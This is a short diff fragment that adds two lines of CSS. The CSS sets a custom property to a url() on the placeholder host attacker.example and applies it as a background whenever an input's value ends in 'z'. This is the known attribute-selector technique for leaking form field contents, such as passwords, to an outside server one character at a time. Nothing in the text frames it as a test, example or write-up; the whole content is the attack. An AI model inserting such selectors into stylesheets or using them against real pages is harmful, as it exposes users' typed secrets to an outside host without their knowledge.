@@ -1,0 +1,2 @@
+:root { --leak: url("https://attacker.example/var"); }
+input[value$="z"] { background: var(--leak); }
